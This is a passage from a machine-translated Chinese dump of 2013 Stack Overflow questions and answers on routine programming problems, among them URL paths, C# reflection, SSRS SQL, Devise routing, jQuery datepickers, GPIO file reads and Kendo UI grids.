有没有办法将诸如图像位置之类的 URL 定向到您的根文件夹，然后从那里进入一个目录。

目前我正在使用“../”返回文件夹，但如果你有一个复杂的目录树，这会很烦人。

谢谢

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2013-04-10T20:59:18.477

它只是一个字符：

```
/ 
```

例如：

```
/image.jpg 
```

无论你把它放在什么页面，它都指向同一个文件，root_folder/image.jpg

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-04-10T21:40:17.360

您还可以使用`<base>`设置所有 url 应该相对于的基本 url。一般来说，使用绝对路径`/`可能是可取的，但`<base>`如果您的页面的“根”*不在*域的根上，则可能会很有用。IE`example.com/mysite/index.html`对比`example.com`

[https://developer.mozilla.org/en-US/docs/HTML/Element/base](https://developer.mozilla.org/en-US/docs/HTML/Element/base)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-10T21:00:09.103

您可以只使用完整的 Url，例如：

```
http://domain.com/file_in_root_folder.jpg 
```

或绝对路径

```
/file_in_root_folder.jpg 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-10T20:57:25.410

您可以使用以 http:// 开头的静态寻址，对于关系寻址，您可以使用带有 / 的地址，例如：/foo/bar.jpg

# java - 利用多核的单线程程序

> ID：15936203
> 
> 赞同：9
> 
> 时间：2013-04-10T20:55:14.370
> 
> 标签：java, multithreading

Java程序的单个线程可以自动使用CPU上的多个内核吗？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2013-04-10T20:58:14.573

> Java程序的单个线程可以自动使用CPU上的多个内核吗？

是和不是。单线程 Java 程序将使用多个线程，因为 GC、JMX、终结器和其他后台线程可以在不同的 CPU（无论是 CPU 还是内核）中运行。如果 GC 线程可以在另一个 CPU 中运行，它们尤其会显着提升性能。但是，您的单线程应用程序代码虽然可以在 CPU 之间*移动*，但永远不会同时在 2 个 CPU 中运行。

> 怎么知道？

这是一个更难的问题，它取决于您运行的架构。 `ps`在 *nix 下将能够显示运行队列中是否有多个线程，但即便如此，它也可能不会显示它们实际上是在多个 CPU 中执行的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-10T21:00:28.057

如果定义为单线程，您自己的代码将不会在多个内核上运行。没有单线程应用程序可以在多个内核上同时运行 - 除非您在不知情的情况下使用底层多线程调用/库。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-10T20:57:27.617

通常 gc 在单独的线程中运行。但通常它不会产生任何显着差异。就这样。

# amazon-web-services - AWS 上是否有任何预构建映像来运行 Twitter - Storm

> ID：15936206
> 
> 赞同：0
> 
> 时间：2013-04-10T20:55:20.120
> 
> 标签：amazon-web-services, amazon-ec2, apache-storm

我对风暴很陌生，我正在尝试在云上运行风暴，所以我使用了来自 github 的storm-deploy 包。但是，如果我做错了什么，请纠正我：

*   - 必须启动实例
*   -手动下载所有软件（java、leinenin等……）
*   -配置风暴
*   - 运行风暴

那么你知道我需要运行storm的包附带的任何亚马逊图像吗？或者可能有人可以共享一些 bash 脚本来完成所有必要的安装。或者可能是我做错了什么？？？？

# c# - 如何在 C# 中获取类中的变量列表

> ID：15936212
> 
> 赞同：2
> 
> 时间：2013-04-10T20:55:23.920
> 
> 标签：c#, list, class, variables

如何获取一个类中所有变量的列表，以便在另一个类中使用以指示哪些变量将被它更改并且可以被它更改。这主要是为了在更改或添加某些变量时不必重写枚举。

编辑：我想创建一个具有一些可以修改的统计信息的类（Main），以及另一种类型的类（ModifyingObject），它列出了可以更改的所有统计信息以及可以更改的程度。我想轻松获取主类的变量，并添加修改类更改哪些变量的列表。如果我假设 10 个变量用于不同的统计信息，我如何轻松列出 ModifyingObject 类可以在 Main 类中更改的所有统计信息。

```
public class Main{

   float SomeStat = 0;
   string SomeName = "name";

   List<ModifyingObject> objects;

   bool CanModifyStatInThisClas(ModifyingObject object){
      //check if the custom object can modify stats in this class
   }

}

public class ModifyingObject{
  ....
} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-10T21:01:00.010

您可以使用反射。

例子：

```
class Foo {
    public int A {get;set;}
    public string B {get;set;}
}

...

Foo foo = new Foo {A = 1, B = "abc"};
foreach(var prop in foo.GetType().GetProperties()) {
    Console.WriteLine("{0}={1}", prop.Name, prop.GetValue(foo, null));
} 
```

从这里：[如何获取类的属性列表？](https://stackoverflow.com/questions/737151/how-to-get-the-list-of-properties-of-class)

属性具有您可能感兴趣的属性 (properties)`CanRead`和。`CanWrite`

文档：http: [//msdn.microsoft.com/en-us/library/system.reflection.propertyinfo.aspx](http://msdn.microsoft.com/en-us/library/system.reflection.propertyinfo.aspx)

不过，你的问题有点含糊。这可能不是最好的解决方案......很大程度上取决于你在做什么。

# java - 如何在用户程序文件目录中创建文件夹？

> ID：15936213
> 
> 赞同：1
> 
> 时间：2013-04-10T20:55:25.473
> 
> 标签：java, filepath

如果 Java 中不存在新文件夹，我知道如何创建它。

```
File directory = new File("path");
directory.mkdir(); 
```

是否所有开发人员都使用该`Program Files`位置为其应用程序创建文件夹来存储数据？对于使用该应用程序的每个用户，该路径是否始终相同？Java 开发人员如何针对 Mac 用户文件路径的差异进行调整？

我还想知道是否`System.getProperty("user.home");`是导航系统以创建文件路径的常用方法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-10T21:20:06.340

对于少数将数据保存到本地的独立和 java web 启动应用程序，我不使用程序文件。讨厌它，因为它有空格，并且 Windows 可以添加或删除版本的权限。

相反，我这样做（我告诉用户它，所以对于一个应用程序来说这并不奇怪我什至打开文件夹，因为有一些用户可编辑的首选项。）： 1\. 检查 c:/apps/sel2in/noteMaker 是否存在不要尝试创建 2\. 如果错误使 d:/apps/.... 3\. 否则使用并使用 System.getProperty("user.home")

使用 mkdirs 以便根据需要创建父文件夹。

仅供参考 / 在 Windows 中的 java 中工作得很好，java 在内部对其进行了更改，并且它比 \ 更容易输入

对于 unix，我通常将参数 1 作为属性文件的路径，并且该文件夹具有保存其他文件和其他首选项的文件夹。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-10T21:06:38.303

对于 32 位电脑上的 32 位程序，或 64 位电脑上的 64 位程序：

```
System.getenv("ProgramFiles") 
```

对于 64 位电脑上的 32 位程序：

```
 System.getenv("ProgramFiles(X86)") 
```

显然，这些仅适用于 Windows 系统。

# sql - 如何在 Visual Studio SSRS 2008 中使用 SQL 使用具有多个条件语句的平均函数

> ID：15936214
> 
> 赞同：0
> 
> 时间：2013-04-10T20:55:25.800
> 
> 标签：sql, ssrs-2008, conditional-statements

我正在尝试使用 Visual Studio SSRS 2008 从 SQL 数据库中提取计算数据。尝试在我的 select/from/where 语句中使用条件时遇到问题。我正在尝试做的一个例子是从每 5 分钟采集的样本中找到 24 小时内（从昨天上午 10:00 到今天上午 10:00）销售的 BTU 的平均数量。我正在报告一个燃气设备，该设备在阀门打开时通过阀门时具有气体流量值。流经特定打开阀门的气体具有我需要平均的 BTU 值。我在下面复制了我当前的查询失败，但我认为它接近它需要的。如果下面提到的其他 2 个标签 > 0，我想要平均其值的标签名是 DTE_BTU。

```
SET NOCOUNT ON
DECLARE @StartDate DateTime
DECLARE @EndDate DateTime
SET @StartDate = DateAdd(HOUR,-24,GetDate())
SET @EndDate = GetDate()
SET NOCOUNT OFF
SELECT case when temp.Value > 0 and temp2.value > 0 then AVG(Value where tagname ='DTE_BTU') end AS 'AvgDTEBTU'
From (
SELECT *
FROM History
WHERE History.TagName IN ('PGPOL_ProdVlv')
AND wwRetrievalMode = 'Cyclic'
AND wwCycleCount = 288
AND wwVersion = 'Latest'
AND DateTime >= @StartDate
AND DateTime <= @EndDate)as temp join
(SELECT * FROM History
WHERE History.TagName IN ('DTE_C_SCFM')
AND wwRetrievalMode = 'Cyclic'
AND wwCycleCount = 288
AND wwVersion = 'Latest'
AND DateTime >= @StartDate
AND DateTime <= @EndDate)as temp2 on temp.DateTime = temp2.DateTime
WHERE temp.StartDateTime >= @StartDate and temp2.StartDateTime >= @StartDate 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-11T02:38:36.470

假设我正确理解了您的信息，您似乎真的只需要查看该时间段的历史表中是否存在其他两个标签，因此您不一定需要案例陈述。

```
SELECT AVG(Value) as Avg_DTE_BTU
FROM History h
WHERE h.wwRetrievalMode = 'Cyclic'
AND h.wwCycleCount = 288
AND h.wwVersion = 'Latest'
AND h.DateTime >= @StartDate
AND h.DateTime <= @EndDate
AND h.tagname = 'DTE_BTU'
AND EXISTS 
(
  SELECT 1
  FROM History x
  WHERE x.wwRetrievalMode = 'Cyclic'
  AND x.wwCycleCount = 288
  AND x.wwVersion = 'Latest'
  AND x.DateTime >= @StartDate
  AND x.DateTime <= @EndDate
  AND x.tagname = 'PGPOL_ProdVlv'
  AND x.value > 0
)
AND EXISTS 
(
  SELECT 1
  FROM History y
  WHERE y.wwRetrievalMode = 'Cyclic'
  AND y.wwCycleCount = 288
  AND y.wwVersion = 'Latest'
  AND y.DateTime >= @StartDate
  AND y.DateTime <= @EndDate
  AND y.tagname = 'DTE_C_SCFM'
  AND y.value > 0
) 
```

如果时间范围内还存在其他两个标签名称，则上述应取该时间范围内所有 DTE_BTU 值的平均值，并返回一行。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-10T21:55:26.977

我不知道为什么“添加评论”对我来说是关闭的......无论如何朋友......我也可以解决这个问题，但它有点不合逻辑......你知道......我想你可以使用或为每个州创建一个表格，然后为每个提交使用一个表格，然后从表格中放置一个 FK 用于提交到与您的州相关的每个表格......我的意思是：

> 你有表“提交”，还有......表“PGPOL_ProdVlv” - 表“DTE_C_SCFM” - 表“DTE_BTU”......我的意思是每个状态都使用一个表。事实上我的意思是（1：N）关系
> 
> 表“提交”
> 1.NO 2.Time 3.
> 其他
> 栏目

接着

> 表“PGPOL_ProdVlv”
> 1.No
> 2.FK_NoSubmit
> 
> 表“DTE_C_SCFM”
> 1.No
> 2.FK_NoSubmit

以及上面的其他状态作为表格...据我所知，这可以使您的查询更加简单和快捷...您同时插入这些状态...

# ios - 在 iPad 上隐藏键盘？

> ID：15936217
> 
> 赞同：1
> 
> 时间：2013-04-10T20:55:45.357
> 
> 标签：ios, objective-c, ipad

我的应用程序的详细信息拆分中有两个文本字段。第一个文本字段将允许用户通过键盘输入数据，但第二个文本字段将允许用户通过弹出框内的选择器输入数据。无论如何，当我按下使用弹出框的文本字段时，我想让键盘（将在编辑第一个文本字段后出现）消失。我使用`resignFirstResponder`并且键盘保持在原位但它被禁用，就像当我点击任何键盘键时没有任何反应（即使关闭键盘的键也不起作用）。那么如何隐藏键盘呢？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-10T20:59:58.360

你应该**使用**

```
[textField resignFirstResponder]; 
```

不是`releaseFirstResponder`（没有这种方法）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-10T21:03:23.540

正如乔治所说，你应该打电话给 resignFirstResponder

但实际上您可能想查看使用 textField 的 inputView 属性，而不是在弹出窗口中使用 pickerview。

你可以说： textfield.inputView = pickerview;

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-10T21:09:43.673

为什么需要第二个`UITextField`？如果您不允许用户使用键盘输入某些内容，请使用 UIButton（可能使用自定义设计），请在按下时显示选择器并在选择器更改时更新按钮的文本

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2013-04-10T21:51:55.703

辞职响应者最简单的事情

```
[self.view endEditing:YES]; 
```

# devise - 使用 Active Admin 和 Devise 的 401 重定向循环

> ID：15936218
> 
> 赞同：2
> 
> 时间：2013-04-10T20:55:46.240
> 
> 标签：devise, ruby-on-rails-3.2, activeadmin, redirect-loop

我有一个带有 Devise (2.2.3) 和 Active Admin (0.5.1) 的应用程序，我先安装了 Devise，然后再安装了 Active Admin。整个应用程序需要登录，所以在我的应用程序控制器中，我有以下内容：

```
before_filter :authenticate_user! 
```

但是，由于将 Active Admin 安装到根命名空间（`config.default_namespace = false`在 initializers/active_admin.rb 中），我的应用程序现在不会让任何人登录。它创建到路径 /users/login 的重定向循环。

我尝试通过在我的 config/application.rb 文件中添加一个 skip_before_filter 来缓解这个问题，但这并没有奏效

```
config.to_prepare do
  Devise::SessionsController.skip_before_filter :authenticate_user!
  UsersController.skip_before_filter :authenticate_user!
end 
```

我还将以下内容添加到 app/admin/user.rb

```
controller do
  skip_before_filter :authenticate_user!
end 
```

这也什么也没做。最后，我尝试在 application_controller.rb 中明确排除两个控制器，但这也没有任何作用。

```
before_filter :authenticate_user!, except: {controller: [:users, 'devise/sessions']} 
```

我该如何解决这个相当烦人的问题？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-15T19:35:31.690

通过改变我的路线解决了这个问题。ActiveAdmin 路由需要在 Devise 路由之后，如下所示：

```
devise_for :users, ActiveAdmin::Devise.config
ActiveAdmin.routes(self) 
```

相信这是因为我在安装和配置 Devise 之后安装了 ActiveAdmin。

# python - 无法在 Python 脚本中显示 MySQL latin2_croation_ci 字符

> ID：15936219
> 
> 赞同：0
> 
> 时间：2013-04-10T20:55:47.343
> 
> 标签：python, mysql, character-encoding

我正在尝试在 Python 脚本中应用 MySQL 记录。我关心的字段使用 latin2_croatian_ci 排序规则字符。当我尝试打印以下字符时，

```
Karadžić
Stanišić & Simatović
Boškoski & Tarčulovski
Đorđević
Ražnatović, Željko 
```

我只得到，

```
Karadži?
Staniši? & Simatovi?
Boškoski & Tar?ulovski
?or?evi?
Ražnatovi?, Željko 
```

我已经尝试了 MySQL 和 Python 的许多策略。在 MySQL 中，我尝试了 CONVERT 和 CAST 的各种组合。在 Python 中，我尝试应用 unicode() 函数。似乎没有任何效果。在 Flash 中，我不得不将嵌入设置为“拉丁扩展 A”来解决类似的问题。

任何和所有提示和/或线索将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-10T21:03:03.400

将此行作为第二行放入您的 python 脚本（之后`#!/usr/bin/python`）

```
# -*- coding: utf-8 -*- 
```

和`utf-8`你应该没问题

# c# - 有没有办法将 C# 字符串插入 SQL varbinary 列？

> ID：15936224
> 
> 赞同：1
> 
> 时间：2013-04-10T20:55:51.523
> 
> 标签：c#, sql-server

我在 C# 中使用`SqlConnection`and`SqlCommand`将字符串行（通过`Parameters.AddWithValue`）插入到 SQL Server 中。我需要插入的一列是`Varbinary`. 有没有办法在 C# 或 SQL Server 中进行转换？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-10T21:00:55.290

根据[this answer](https://stackoverflow.com/questions/10522605/why-is-convert-string-to-varbinary-in-sql-server-only-converting-first-character)，您可以使用该`CONVERT`函数将字符串插入`VARBINARY`列中。确保使用正确的编码，如该答案中所述。

```
insert Table_2 (Test) values( CONVERT(varbinary(30), N'this is a test') ) 
select * from Table_2
select CONVERT(nvarchar(30), test) from Table_2 
```

所以 C# 代码看起来像

```
 // Get from config
    string connectionString = "";

    using (var conn = new SqlConnection(connectionString))
    {
        string sql = "insert Table_2 (Test) values( CONVERT(varbinary(30), @nvarcharParam) )";
        using (var cmd = new SqlCommand(sql, conn))
        {
            var param = cmd.Parameters.AddWithValue("nvarcharParam", "This is a test");
            param.DbType = DbType.String;

            cmd.ExecuteNonQuery();
        }
    } 
```

# jquery - 通过单击链接打开 Datepicker

> ID：15936229
> 
> 赞同：2
> 
> 时间：2013-04-10T20:56:04.063
> 
> 标签：jquery, jquery-ui, calendar, datepicker

我在我的网页上使用 JQuery UI 的 Datepicker。目前，我已经成功地让它与一个名为“mydate”的文本字段一起工作。代码如下：

```
$('#releasedate').datepicker({
                changeYear: 'true',
                changeMonth:'true',
                startDate: '07/16/1989',
                firstDay: 1
            }); 
```

但是，我想要一点点改变。而不是文本字段，我想显示一个名为“选择日期”的链接，它应该打开日期选择器，并且在选择日期后，需要更新隐藏文本字段的值。

我尝试了不同的方法来做到这一点，但都没有成功。jQuery专家，你能帮帮我吗？我急切地等待收到解决方案。非常感谢您提前。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-04-10T20:59:11.040

您实际上可以将 datepicker 附加到 an`<input type="hidden" />`并使链接成为打开它的触发器：

```
$(function() {
    $('#hiddenDate').datepicker({
        changeYear: 'true',
        changeMonth: 'true',
        startDate: '07/16/1989',
        firstDay: 1
    });
    $('#pickDate').click(function (e) {
        $('#hiddenDate').datepicker("show");
        e.preventDefault();
    });
});
```

```
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
<link href="https://ajax.googleapis.com/ajax/libs/jqueryui/1.12.0/themes/smoothness/jquery-ui.css" rel="stylesheet"/>
<script src="https://ajax.googleapis.com/ajax/libs/jqueryui/1.12.0/jquery-ui.min.js"></script>

<input id="hiddenDate" type="hidden" />
<a href="#" id="pickDate">Select Date</a>
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-10T21:12:59.340

尝试这个：

```
$('#datepicker').datepicker('hide');
$('a').click(function () {
    $('#datepicker').datepicker('destroy');
    $('#datepicker').datepicker({
        altField: '#shhh',
        changeYear: 'true',
        changeMonth: 'true',
        firstDay: 1,
        onSelect: function () {
            $('#datepicker').datepicker('destroy');
        }
    })
}); 
```

**[jsFiddle 示例](http://jsfiddle.net/j08691/sVd8j/)**

# php - Html5 验证或功能 - 我不能两者兼得吗？

> ID：15936238
> 
> 赞同：0
> 
> 时间：2013-04-10T20:56:18.610
> 
> 标签：php, facebook, html

我有这个链接给 facebook 一个分享的可能性。

```
<a href="https://www.facebook.com/sharer.php?display=popup&u=<?php echo urlencode($this->Environment->base . $this->Environment->request); ?>&t=<?php echo urlencode($this->title); ?>" rel="nofollow" title="Auf Facebook teilen" target="blank"  onclick="window.open(this.href, '', 'width=760,height=570,modal=yes,left=100,top=50,location=no,menubar=no,resizable=yes,scrollbars=yes,status=no,toolbar=no'); return false;"><img src="system/modules/news4ward/html/social/facebook.png" alt="Facebook" width="30" height="30"></a> 
```

我的问题是，它不会在 HTML5 文档中验证。更改`&`为`%26`将修复验证，但会破坏 facebook 共享，因为它不会获取打开的图形描述。

我能做些什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-11T16:03:10.483

尝试将原始 & 符号更改`&`为 HTML 实体`&amp;`

# html - 使标题文本以类似盒子的方式重叠其底部边框

> ID：15936241
> 
> 赞同：-1
> 
> 时间：2013-04-10T20:56:33.463
> 
> 标签：html, css

我正在尝试创建与附加图像等效的 HTML/CSS。该规范以图像形式提供给我。

文本必须集中，并且可以是动态宽度。

底部的边框必须始终延伸到标题元素的边缘。

边框必须在文本开始和结束的地方停止。

有什么想法是实现这一目标的最佳方法吗？

由于我还没有足够的代表来发布图片，这里有一个链接：

[附件图片](https://docs.google.com/file/d/0B30pLbbctznANExaeHhyUTlHamc/edit?usp=sharing)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-10T21:22:45.440

你如何去做将取决于你是否需要它在印刷背景上工作。

[http://codepen.io/cimmanon/pen/gnEdA](http://codepen.io/cimmanon/pen/gnEdA)

# 弹性盒

这可以在打印的背景上工作，但浏览器支持很差：IE10、Opera、Chrome。它不需要额外的标记。 [http://caniuse.com/#feat=flexbox](http://caniuse.com/#feat=flexbox)

```
h1 {
  display: -webkit-flexbox;
  display: -ms-flexbox;
  display: -webkit-flex;
  display: flex;
  font-style: italic;
}

h1:before, h1:after {
  display: block;
  border-bottom: 2px solid blue;
  content: " ";
  margin-bottom: 6px;
  -webkit-flex: 1 1;
  -ms-flex: 1 1;
  flex: 1 1;
} 
```

# 白色背景

这应该适用于您能想到的任何浏览器。但是，它需要坚实的背景和额外的标记。

```
h1 {
  border-bottom: 2px solid blue;
  text-align: center;
}

h1 span {
  background: white;
  position: relative;
  top: 6px;
} 
```

# c - gpio 端口的文件描述符 I/O 中有奇怪的东西

> ID：15936243
> 
> 赞同：0
> 
> 时间：2013-04-10T20:56:39.377
> 
> 标签：c, file-io, embedded-linux, file-descriptor

我正在使用以下代码在 Linux 中进行编码以控制板上的 gpio 端口。但是，read() 的结果始终是 0x10，它是用于 LF 换行的十六进制。电压是一个枚举变量，int 值为 0，1 代表低和高。fd 是 gpio 端口的文件描述符。0x30 是字符“0”的十六进制代码。write() 中没有错误。

```
int set_gpio( int fd,enum voltage_e voltage)
{
    const unsigned char w_buff =0x30+voltage;
    unsigned char r_buff='2';

    if (0 >= write(fd, &w_buff, 1))
    {
        LOGD(" Error1 in setting gpio to  %d", voltage);
        return -1;
    }
    __usr_sleep(0, 10000000);

    if (read(fd, &r_buff, 1))
    {
        if (r_buff != 0x30+voltage)
        {
            LOGD(" r_buff is %d", r_buff);
            return -1;
        }
    }
    else
    {
        LOGD(" Error3 in setting gpio to %d", voltage);
        return -1;
    }
    return 0;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-10T23:32:32.250

为了与 shell 实用程序兼容，GPIO 端口的内容通常是单个字符后跟换行符——例如：

```
% xxd /sys/class/gpio/gpio89/value
0000000: 310a                                     1. 
```

将单个字符写入 GPIO 设备会将文件指针推进到第二个字符，这始终是您看到的换行符。

在执行读/写操作之前，您需要将文件指针重置为开头：

```
lseek(fd, 0, SEEK_SET); 
```

# c - 如何从 C 程序更改目录，以便在程序完成时仍保留更改？

> ID：15936244
> 
> 赞同：1
> 
> 时间：2013-04-10T20:56:46.127
> 
> 标签：c, batch-file, directory, executable

我正在编写一个类似于“cd”命令但使用快捷方式的程序。

（保存路径：cds -s 1 C:\saved\directory\path）（切换到保存路径：cds 1）

为此，我尝试了 chdir() 和 system() ，但效果只在程序运行时持续。一旦程序终止，路径就会恢复到程序运行之前的状态。我目前正在使用一种解决方法，方法是使用一个 bat 文件加载我的程序，该文件运行由该程序创建的另一个 bat 文件（包含 cd 命令）。

所以我的 bat 文件类似于：

```
cds.exe %1 %2 %3
C:\temp\cds_cmd.bat
del C:\temp\cds_cmd.bat 
```

cds_cmd.bat 由 cds.exe 生成

我真的很想知道是否有其他方法可以在不使用 bat 文件的情况下做到这一点。

我发现并阅读[了有没有办法使用 C 语言更改目录？](https://stackoverflow.com/questions/1293660/is-there-any-way-to-change-directory-using-c-language)但没有找到我要找的东西。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-10T22:10:49.687

这不是您的 C 问题的答案，而是仅使用 Batch 的替代解决方案：

要保存路径：

```
set 1=C:\saved\directory\path 
```

要切换到已保存的路径：

```
cd %1% 
```

如果您愿意，您可以为此目的使用不同的变量名（不是数字）。

# wcf - 查找 WCF 将向哪个方法分派 RESTful 请求

> ID：15936245
> 
> 赞同：1
> 
> 时间：2013-04-10T20:56:50.957
> 
> 标签：wcf, wcf-rest, method-dispatch

假设我使用以下合同实现了 WCF [REST服务。](http://en.wikipedia.org/wiki/Representational_State_Transfer)

```
[ServiceContract]
interface INotesService
{
    [OperationContract]
    [WebInvoke(Method = "GET",
        UriTemplate = "notes/{id}")]
    Note GetNote(string id);

    [OperationContract]
    [WebInvoke(Method = "GET",
        UriTemplate = "notes")]
    IEnumerable<Note> GetNotes();
} 
```

现在，我在管道中有一个 HttpModule 来进行授权，但是该代码需要知道请求将被分派到哪个方法。如何找到将由 WCF 调用的方法的签名？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T23:48:35.443

尽管另一个答案让我走上了正确的道路，但它并没有真正回答我的问题。

后来我发现这个链接给了我一个可行的解决方案： http: [//tech.blog.oceg.org/2009/04/authorizing-rest-calls-in-wcf.html](http://tech.blog.oceg.org/2009/04/authorizing-rest-calls-in-wcf.html)

但是，我发现它比需要的更复杂。在 .NET 4.5（这就是我正在使用的）中，您可以执行以下操作。

我从 ServiceHost.ApplyConfiguration 覆盖注册了我的 ServiceAuthorizationManager。

```
this.Authorization.ServiceAuthorizationManager = 
       new MyServiceAuthorizationManager(); 
```

然后，在它的 CheckAccessCore 方法中，我调用了下面的方法，为我提供了请求将被分派到的方法的名称。

```
private string GetOperationName(OperationContext operationContext)
{
    return messageProperties["HttpOperationName"] as string;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-11T04:47:57.423

我认为您应该使用[IDispatchOperationSelector](http://msdn.microsoft.com/en-us/library/system.servicemodel.dispatcher.idispatchoperationselector.aspx)。

另请参阅本文：[WCF 可扩展性 - 操作选择器](http://blogs.msdn.com/b/endpoint/archive/2011/05/10/wcf-extensibility-operation-selectors.aspx)

# android - 如何防止 android 模拟器窃取我的全屏 google chrome 的焦点，显示带有 Wall Display Plugin 的 Jenkins

> ID：15936249
> 
> 赞同：0
> 
> 时间：2013-04-10T20:56:57.777
> 
> 标签：android, macos, android-emulator, fullscreen, jenkins-plugins

我知道这是一个非常具体的问题，但我在房间中间的 Mac 上运行我的持续集成服务器（所以每个人都可以看到），每次 android 测试运行模拟器时，都会从显示 Jenkins 的 Google Chrome 中窃取焦点面板（带墙显示插件）。我已经使用了无头版本的 Android 模拟器，但即便如此，模拟器还是抢了焦点。

类似的问题也在mac交换上发布：[https ://apple.stackexchange.com/questions/39978/how-can-i-prevent-java-processes-from-stealing-focus/88435#88435](https://apple.stackexchange.com/questions/39978/how-can-i-prevent-java-processes-from-stealing-focus/88435#88435)

# macos - 应用程序在其他 Mac 上给出“无法打开 .app，因为不支持经典环境”，但我自己可以正常工作

> ID：15936250
> 
> 赞同：4
> 
> 时间：2013-04-10T20:57:00.300
> 
> 标签：macos, bash, osascript, platypus

我写了一个 bash 脚本的应用程序，整个东西是一个 bash 脚本，它调用了一些 osascripts，也主要用于用户输入，它在我的电脑上运行得很好，所以我用 platypus 把脚本变成了一个应用程序，以便我可以将其发送给朋友，当他尝试打开它时，它说您无法打开应用程序**，因为不再支持经典环境：[http ://www.imgur.com/ze0ya4B .png](http://www.imgur.com/ze0ya4B.png)

任何运行 bash 的 Mac 至少应该能够运行正确吗？可能是 osascripts 的东西吗？我在论坛中找不到任何人有同样问题并解决它的东西。

Tl; Dr：通过 platypus 放置 bash 脚本，当另一台 Mac 尝试打开新的 .app 文件时会出错。

我正在运行山狮，所以我的 macbook 也不应该支持经典环境，这可能会让其他计算机认为经典环境中有一些东西。如果您认为这会有所帮助，我可以上传我的源代码。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-04-11T06:01:21.880

我必须假设我得到的错误与我提供的任何信息都不是很相关。事实证明，您不能只是通过电子邮件发送一个 .app 文件，然后期望它在另一端完整地输出。我将应用程序压缩到一个文件夹中，它工作正常。万一有人遇到同样的问题，我想我会发布我的情况......我希望这对某人有所帮助，因为我肯定会把头撞在桌子上。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-10T21:36:11.080

我很确定该消息具有误导性，并且由于某些其他原因实际上无法运行。该对话框看起来像旧版本的 OS X。运行您正在使用的鸭嘴兽版本可能太旧了？当前[版本](http://sveinbjorn.org/platypus)需要在 Intel CPU 上运行 OS X v10.5 或更高版本。对于 OS X 10.4 和/或 PowerPC CPU，Sveinbjorn Thordarson（作者）从[此处](http://sveinbjorn.org/files/software/platypus/)推荐 Platypus 4.4 版。

# javascript - 如何强制刷新充满远程数据的 Kendo UI Grid？

> ID：15936258
> 
> 赞同：7
> 
> 时间：2013-04-10T20:57:14.843
> 
> 标签：javascript, jquery, datagrid, kendo-ui

我有一个 Kendo UI Grid，其中填充了来自远程源的信息，我想强制刷新我网站上的 Kendo UI 窗口关闭后显示的信息。

我试过这个：

```
var grid = $("#usuariosGrid").data("kendoGrid");
grid.refresh(); 
```

但它没有用，这就是我创建 Kendo UI Grid 的方式：

```
var ds = new kendo.data.DataSource({
    transport: {
        read: {
            url: root_url + "/usuario/index",
            dataType: "json"
        }
    },
    schema: {
        data: "Response",
        total: "Count"
    },
    serverPaging: false,
    pageSize: 2
});
$("#usuariosGrid").kendoGrid({
    pageable: {
        refresh: true
    },
    columns: [
        { field: "UsuarioId", title: "ID", width: "100px" },
        { field: "Nombre", title: "Nombre", width: "100px" },
        { field: "ApellidoP", title: "Apellido Paterno", width: "100px" },
        { field: "ApellidoM", title: "Apellido Materno", width: "100px" },
        { command: [{  text: "Editar", click: editFunction }, { text: "Eliminar", click: deleteFunction }], title: " ", width: "200px" }
    ],
    dataSource: ds
}); 
```

我查看了文档，但没有找到执行此操作的方法。

在旁注中，我一直想知道如何在 Kendo UI Grid 上显示加载动画，同时将数据加载到其中，它在加载后显示并且我正在单击网格的页面，但是当没有数据时，它看起来已折叠，我想显示一个加载动画，以使其在加载信息时看起来已填充。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-10T23:15:57.870

正如@NicholasButtler 建议的那样，`ds.read()`用于强制读取。根据您的`DataSource`定义，结果可能会被缓存。检查[启用](http://docs.kendoui.com/api/framework/datasource#configuration-transport.read.cache)/禁用`transport.read.cache`。

为了替换加载图像，重新定义类`.k-loading-image`。例子：

```
.k-loading-image {
    background-image:url('http://24.media.tumblr.com/cfa55f70bbc5ce545eed804fa61a9d26/tumblr_mfpmmdCdWA1s1r5leo1_500.gif')
} 
```

**编辑**为了保证您有足够的空间来显示图像，请添加以下样式定义：

```
#grid .k-grid-content {
    min-height: 100px;
} 
```

小提琴示例：http: [//jsfiddle.net/OnaBai/nYYHk/1/](http://jsfiddle.net/OnaBai/nYYHk/1/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-24T13:07:35.277

我在加载远程数据时遇到了加载图像未显示的问题，但我注意到它仅在某些网格上。

事实证明，如果您使用：`scrollable: false`选项配置网格，加载图像会按预期显示。`min-height`如果您也在分页，则无需在 CSS 中使用 a ，也无需使用可滚动网格。

# vector - （方案）没有缺点的递归？

> ID：15936262
> 
> 赞同：1
> 
> 时间：2013-04-10T20:57:25.970
> 
> 标签：vector, scheme

